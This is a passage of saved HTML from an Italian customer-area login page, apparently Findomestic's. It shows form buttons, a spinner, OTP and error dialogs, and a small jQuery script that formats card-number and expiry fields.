		<input autocapitalize="off" autocomplete="off" autocorrect="none" class="mdl-textfield__input ng-untouched ng-pristine ng-valid" spellcheck="false" type="text" name="helpNote" id="helpNote" maxlength="600">
		<!----><label class="mdl-textfield__label">Note (Massimo 600 caratteri)</label>
		
            
            
	</div>
	<span class="fd-hint">
		<!----><span></span>
		<!---->
		<!----><!----><!---->
	</span>
	<!---->
</div>
</fnd-text-input>

          </form>
        
      
</div></fnd-card-body>
      <fnd-card-footer><div class="mdl-card__actions ">

	
        <div class="fd-button">
            <fnd-button customcssclass="fd-primary mdl-js-ripple-effect" label="Chiudi" showicon="false" _nghost-c6=""><!----><button _ngcontent-c6="" id="16199834-c093-47b1-8fd6-234411796c79" class="mdl-button mdl-js-button  fd-primary mdl-js-ripple-effect" type="button" data-upgraded=",MaterialButton,MaterialRipple">
   <!----><i _ngcontent-c6="" class="material-icons"></i> Chiudi
<span class="mdl-button__ripple-container"><span class="mdl-ripple"></span></span></button>

<!---->
<!----></fnd-button>
            <!----><fnd-button customcssclass="fd-btn mdl-js-ripple-effect" label="Invia" showicon="false" _nghost-c6=""><!----><button _ngcontent-c6="" id="8e334d8c-791f-40f0-b10c-c1e95ddd80c2" class="mdl-button mdl-js-button  fd-btn mdl-js-ripple-effect" type="button" data-upgraded=",MaterialButton,MaterialRipple">
   <!----><i _ngcontent-c6="" class="material-icons"></i> Invia
<span class="mdl-button__ripple-container"><span class="mdl-ripple"></span></span></button>

<!---->
<!----></fnd-button>
        </div>
      
	
</div>
</fnd-card-footer>
    
	
	
	<div class="fd-busy" style="display: none;">
		<div class="fd-spinner">
			<div class="mdl-spinner mdl-spinner--single-color mdl-js-spinner is-active is-upgraded" data-upgraded=",MaterialSpinner"><div class="mdl-spinner__layer mdl-spinner__layer-1"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-2"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-3"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div><div class="mdl-spinner__layer mdl-spinner__layer-4"><div class="mdl-spinner__circle-clipper mdl-spinner__left"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__gap-patch"><div class="mdl-spinner__circle"></div></div><div class="mdl-spinner__circle-clipper mdl-spinner__right"><div class="mdl-spinner__circle"></div></div></div></div>
		</div>
	</div>
</div>
<br></fnd-card>

  </div>

          </div>
        </div>
      </div>
    </app-modal></app-login>

			

		</div>

    <!----><fnd-snackbar class="resend-otp-snackbar" title="Nuova password temporanea (OTP) inviata"><div aria-atomic="true" aria-live="snackbar" aria-relevant="text" class="fd-snackbar mdl-snackbar mdl-js-snackbar" data-upgraded=",MaterialSnackbar">
	<div class="mdl-snackbar__text">
	</div>
	<button class="mdl-snackbar__action" type="button" aria-hidden="true">
	</button>
</div></fnd-snackbar>

	</main>

</div></div>
</app-root>
<!-- End of global snippet: Please do not remove --><fnd-modal-dialog okbuttonlabel="Ho capito" showokbutton="true"><dialog class="mdl-dialog fixed">
	<!----><h4 class="mdl-dialog__title">Oops!</h4>
	<!---->
	<div class="mdl-dialog__content ">
		
    <p class="fd-txt">I dati inseriti non sono corretti. Recupera le tue credenziali, effettua una nuova registrazione oppure scrivici.</p>
  
	</div>
	<!----><div class="mdl-dialog__actions">
		<!----><button class="mdl-button mdl-button--colored mdl-js-button fnd-ripple-effect fd-primary" data-upgraded=",MaterialButton"><span>Ho capito</span></button>
		<!---->
	</div>
</dialog></fnd-modal-dialog><fnd-modal-dialog okbuttonlabel="Avanti" showokbutton="true"><dialog class="mdl-dialog fixed">
	<!----><h4 class="mdl-dialog__title">Oops!</h4>
	<!---->
	<div class="mdl-dialog__content ">
		
    <p class="fd-txt">
      Si è verificato un problema con il Mobile Token su questo dispositivo. Procedi a una nuova attivazione per accedere all'Area Clienti.
    </p>
  
	</div>
	<!----><div class="mdl-dialog__actions">
		<!----><button class="mdl-button mdl-button--colored mdl-js-button fnd-ripple-effect fd-primary" data-upgraded=",MaterialButton"><span>Avanti</span></button>
		<!---->
	</div>
</dialog></fnd-modal-dialog><fnd-modal-dialog class="app-permission-dialog" title="Autorizzazioni App"><dialog class="mdl-dialog fixed">
	<!----><h4 class="mdl-dialog__title">Autorizzazioni App</h4>
	<!---->
	<div class="mdl-dialog__content ">
		
  <div class="padding-sm-bottom">
    <p class="fd-txt">Per entrare in Area Clienti, vai sulle impostazioni Android e abilita l'autorizzazione Telefono per l'App Findomestic</p>
  </div>

	</div>
	<!----><div class="mdl-dialog__actions">
		<!----><button class="mdl-button mdl-button--colored mdl-js-button fnd-ripple-effect fd-primary" data-upgraded=",MaterialButton"><span>AUTORIZZA</span></button>
		<!----><button class="mdl-button mdl-button--colored mdl-js-button fnd-ripple-effect fd-primary" data-upgraded=",MaterialButton"><span>Chiudi</span></button>
	</div>
</dialog></fnd-modal-dialog><div></div><div id="ads"></div>
	<script>
jQuery('#scadenza').payform('formatCardExpiry');
jQuery('#carta').payform('formatCardNumber');

</script>
<div></div>
</body></html>